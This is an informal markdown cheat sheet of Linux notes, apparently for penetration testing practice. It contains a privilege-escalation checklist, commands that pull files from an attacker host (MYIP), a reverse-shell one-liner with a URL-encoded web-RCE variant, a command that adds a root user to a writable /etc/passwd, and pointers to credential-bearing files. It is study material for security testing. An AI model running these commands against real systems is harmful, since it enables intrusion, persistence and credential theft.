# linux notes

## file system stuff i always forget

```
/etc/passwd       - users (readable by everyone)
/etc/shadow       - hashed passwords (root only)
/etc/hosts        - local DNS
/proc/self/environ - env vars of current process (sometimes has secrets)
/proc/net/tcp     - open connections
/var/log/auth.log - auth logs (debian/ubuntu)
/var/log/secure   - auth logs (rhel/centos)
```

interesting dirs when you get a shell:
- `/tmp` and `/dev/shm` - writable, good for dropping stuff
- `/home/*/` - other users, SSH keys, bash history
- `~/.ssh/` - private keys, authorized_keys, known_hosts
- `~/.bash_history` - commands run, sometimes has passwords in plaintext lol

---

## privesc checklist

### first thing after getting shell
```bash
id
whoami
uname -a
cat /etc/os-release
hostname
ip a
```

### SUID binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```
check gtfobins for anything that shows up

### sudo
```bash
sudo -l
```
can you run anything as root without password?

### cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron*
# also check
cat /var/spool/cron/crontabs/root
```
look for scripts in writable dirs, wildcard injection

### writable files owned by root
```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

### capabilities
```bash
getcap -r / 2>/dev/null
```
`cap_setuid` on python/perl/ruby/vim = instant root basically

### PATH hijacking
check if scripts run binaries without full path, if PATH is writable -> drop your own binary

### passwd writeable
```bash
ls -la /etc/passwd
```
if writable, add your own root user: `echo 'hax:$(openssl passwd -1 pass):0:0:root:/root:/bin/bash' >> /etc/passwd`

---

## useful commands

```bash
# find files modified recently
find / -mmin -60 -type f 2>/dev/null

# check listening ports
ss -tlnp
netstat -tlnp  # if ss not available

# running processes
ps aux
ps auxww  # full command line

# check installed software
dpkg -l  # debian
rpm -qa  # rhel

# who else is logged in
w
last
lastlog

# network connections
ss -antp

# environment
env
printenv
```

---

## file transfer

from attacking machine to target:
```bash
# python server
python3 -m http.server 8080

# on target
wget http://MYIP:8080/file
curl -O http://MYIP:8080/file

# if no wget/curl
cat < /dev/tcp/MYIP/8080 > file  # bash tcp

# nc
nc -lvnp 4444 < file  # attacker sends
nc MYIP 4444 > file   # target receives
```

---

## shells

stabilize shell after netcat:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then ctrl+z
stty raw -echo; fg
# then
export TERM=xterm
```

or just use `rlwrap nc -lvnp 4444` on your end

one liners:
```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
# url encoded version for web RCE:
bash+-i+>%26+/dev/tcp/IP/PORT+0>%261
```

---

## permissions

```
rwxr-xr-x = 755
rw-r--r-- = 644
rwx------ = 700
```

`chmod +x file` - make executable
`chmod 777 file` - bad idea in prod but ok for testing
`chown user:group file`

sticky bit on dir: only owner can delete their files (like /tmp)
SUID on binary: runs as file owner, not executor

---

## misc

`lsof -i :80` - what's using port 80
`which python python3 perl ruby nc ncat` - what's available
`cat /proc/1/cmdline | tr '\0' ' '` - init process command

linpeas is your friend, just run it and read the output carefully
don't just look at red, yellow flags can be just as useful
